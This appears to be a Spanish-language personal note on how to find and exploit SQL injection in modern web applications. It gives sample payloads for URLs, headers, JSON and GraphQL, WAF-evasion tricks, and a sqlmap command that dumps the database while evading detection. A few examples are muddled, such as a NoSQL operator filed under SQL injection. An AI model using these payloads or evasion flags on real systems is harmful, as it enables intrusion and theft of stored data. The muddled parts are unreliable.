---
tags:
  - HackingTools
---
---
***!*** Tu sistema está configurado para servir archivos desde **`/srv/http`** en lugar de la tradicional **`/var/www/html`**
***!*** En Arch Linux, el servicio `httpd.service` corresponde a **Apache**

- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#SQLInjectionQuickChecks
- https://github.com/payloadbox/sql-injection-payload-list

**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

***!*** No busques solo en URLs con `id=1`, revisa JSON, headers y APIs.

---

# **🚀 Metodología para Encontrar SQLi Moderno (Paso a Paso)**

📌 **Objetivo:** Encontrar SQLi en aplicaciones modernas que usan **WAFs, ORM, frameworks y validaciones avanzadas**.  
📌 **Problema:** **Las inyecciones básicas (`' --`) ya no suelen funcionar**, por lo que necesitamos técnicas más avanzadas.

---

## **🟢 1️⃣ Identificar Parámetros Potenciales para SQLi**

📌 **¿Dónde buscar?**  
✅ **URLs con parámetros (GET/POST)**  
Ejemplo:

```
https://target.com/profile.php?id=123
```

✅ **JSON en APIs REST/GraphQL**

```json
{
  "user": "admin"
}
```

✅ **Cookies, User-Agent y Referer**

```http
Cookie: session=123
User-Agent: Mozilla/5.0' OR 1=1 --
```

✅ **Puntos No Tradicionales: URLs Amigables**  
Ejemplo:

```
https://target.com/home/<POTENCIAL SQLi>
```

📌 **¿Puedo inyectar en URLs como `home/<aquí>`?**  
➡️ **Depende de cómo el backend maneja el enrutamiento.**  
Si `home/<valor>` se usa internamente en una consulta SQL, **sí podría ser vulnerable**.  
🔹 Prueba agregar comillas o caracteres especiales:

```
https://target.com/home/test'
https://target.com/home/1' OR 1=1 --
```

📌 **Si la URL se transforma internamente en una consulta SQL como esta:**

```sql
SELECT * FROM paginas WHERE slug = 'home/test';
```

🎯 **Entonces es vulnerable a SQLi.**

➡️ **Recomendación:** Captura peticiones con Burp Suite y revisa si la URL se refleja en headers o respuestas.

---

## **🟡 2️⃣ Evadir Filtrados y WAFs**

Las protecciones modernas filtran `' OR 1=1 --`, pero podemos **bypassearlas** con:

🔹 **Codificación:**  
✅ **UTF-8, Unicode:**

```
%C2%BF OR 1=1 --
```

✅ **Hexadecimal:**

```
0x70617373776F7264  -- (Traduce "password" a hex)
```

✅ **Base64:**

```
YWRtaW4nICBPUiAxPTEtLQ==
```

🔹 **Técnicas de Bypass WAF**  
✅ **Comentarios entre palabras clave:**

```sql
1 /*!50000UNION*/ /*!50000SELECT*/ user, password FROM users;
```

✅ **Uso de palabras clave alternativas:**

```sql
SELECT username FROM users WHERE id=1 LIMIT 1;
```

Prueba:

```
id=1' LIMIT 1 --
```

✅ **Uso de subconsultas:**

```sql
SELECT (SELECT password FROM users LIMIT 1) FROM dual;
```

➡️ **Esto puede funcionar si la consulta no permite `UNION`.**

---

## **🟠 3️⃣ SQLi en APIs REST/GraphQL (No URLs Simples)**

En sistemas modernos, la SQLi ocurre en **cuerpos JSON, headers o parámetros internos**.  
Ejemplo de petición REST:

```json
{
  "username": "admin",
  "password": "' OR 1=1 --"
}
```

📌 **Bypass con JSON Injection:**

```json
{
  "user": {"$ne": null}
}
```

📌 **Inyección en GraphQL:**

```graphql
{
  user(id: "1' OR 1=1 --") {
    username
    email
  }
}
```

➡️ **Cómo testear APIs:** Usa Burp Suite y prueba modificar los valores de los JSONs enviados.

---

## **🔴 4️⃣ Automatización con SQLMap en Casos Complejos**

Si confirmas que un parámetro puede ser vulnerable, usa SQLMap con técnicas avanzadas:

```bash
sqlmap -u "https://target.com/api/user?id=1" --level=5 --risk=3 --tamper=space2comment.py --dump
```

✅ `--tamper` usa scripts para evadir WAFs.  
✅ `--level=5 --risk=3` prueba payloads más agresivos.  
✅ `--dump` extrae datos de la base de datos.

➡️ **Si la web usa WAF fuerte, prueba con `--random-agent --delay=2` para evadir detección.**

---

# **📌 Conclusión**

✅ **No busques solo en URLs con `id=1`, revisa JSON, headers y APIs.**  
✅ **Si la web usa enrutamiento como `home/<valor>`, prueba inyecciones ahí.**  
✅ **Evita ataques básicos y usa técnicas como Unicode, subconsultas y JSON Injection.**  
✅ **Automatiza con SQLMap cuando confirmes que hay SQLi posible.**
